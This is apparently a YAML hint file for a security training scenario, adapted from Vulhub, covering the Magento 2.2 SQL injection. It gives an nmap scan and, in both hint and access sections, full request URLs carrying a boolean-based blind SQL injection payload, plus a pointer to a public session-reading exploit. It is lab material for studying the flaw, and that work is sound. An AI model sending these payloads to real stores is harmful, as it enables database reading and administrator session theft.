@@ -1,0 +1,83 @@
+# Optional ScenarioForge guide hints; derived from the adjacent public Vulhub documentation.
+schema_version: 1
+match: magento/2.2-sqli
+hint_levels:
+  low:
+  - Inspect the magento service or application on {{NODE_NAME}} @ {{NODE_IP}}.
+  medium:
+  - |-
+    Catalog TCP ports: 8080. Identify the exposed services:
+
+    ```bash
+    nmap -Pn -sT -sV -p 8080 {{NODE_IP}}
+    ```
+  - 'Catalog port mappings (published → container): web: 8080/tcp → container 80/tcp. These are recipe defaults;
+    use the deployed service port if the scenario remaps it.'
+  - 'Documented target URL(s): `http://{{NODE_IP}}:8080`, `http://{{NODE_IP}}:8080/catalog/product_frontend_action/synchronize`.'
+  high:
+  - 'Vulnerability: Magento 2.2 SQL Injection.'
+  - |-
+    Vulnerability Reproduction
+
+    Visit the following links:
+
+    - `http://{{NODE_IP}}:8080/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d0)+--+-`
+    - `http://{{NODE_IP}}:8080/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d1)+--+-`
+
+    You can see that when executing `))) OR (SELECT 1 UNION SELECT 2 FROM DUAL WHERE 1=1) -- -` and `))) OR (SELECT 1 UNION SELECT 2 FROM DUAL WHERE 1=0) -- -`, the returned HTTP status codes are different:
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/magento/2.2-sqli/2.png
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/magento/2.2-sqli/3.png
+
+    By changing the OR condition, you can perform SQL boolean-based blind injection.
+
+    Using this POC: https://github.com/ambionics/magento-exploits, you can read the administrator's session:
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/magento/2.2-sqli/4.png
+  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/magento/2.2-sqli/README.md'
+  - |-
+    Additional public references:
+    - https://www.ambionics.io/blog/magento-sqli
+    - https://devdocs.magento.com/guides/v2.2/release-notes/ReleaseNotes2.2.8CE.html
+access_instructions:
+  title: Magento 2.2 SQL Injection
+  steps:
+  - title: Locate the target service
+    instructions: |-
+      Catalog TCP ports: 8080. Identify the exposed services:
+
+      ```bash
+      nmap -Pn -sT -sV -p 8080 {{NODE_IP}}
+      ```
+
+      Catalog port mappings (published → container): web: 8080/tcp → container 80/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.
+
+      Documented target URL(s): `http://{{NODE_IP}}:8080`, `http://{{NODE_IP}}:8080/catalog/product_frontend_action/synchronize`.
+  - title: Vulnerability Reproduction
+    instructions: |-
+      Visit the following links:
+
+      - `http://{{NODE_IP}}:8080/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d0)+--+-`
+      - `http://{{NODE_IP}}:8080/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d1)+--+-`
+
+      You can see that when executing `))) OR (SELECT 1 UNION SELECT 2 FROM DUAL WHERE 1=1) -- -` and `))) OR (SELECT 1 UNION SELECT 2 FROM DUAL WHERE 1=0) -- -`, the returned HTTP status codes are different:
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/magento/2.2-sqli/2.png
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/magento/2.2-sqli/3.png
+
+      By changing the OR condition, you can perform SQL boolean-based blind injection.
+
+      Using this POC: https://github.com/ambionics/magento-exploits, you can read the administrator's session:
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/magento/2.2-sqli/4.png
+guidance_source:
+  repository: https://github.com/vulhub/vulhub
+  snapshot_commit: 3af973a39bd0988f288a53fa9ea4b82372774e58
+  documentation_url: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/magento/2.2-sqli/README.md
+  readme_sha256: 68be7a4e300b5e4a427348222b9f2771d32e892d2110d9b19153af64fe3e6a8c
+  compose_sha256: da1c10b166bd0b855032f72e9b6501647306a9def2b73fb32dcd47d3a37f41ab
+  license: MIT; see vulnhub/content/LICENSE
+  method: Tiered discovery hints and adapted reproduction text from the local catalog snapshot. Reproduction commands
+    have not been executed.
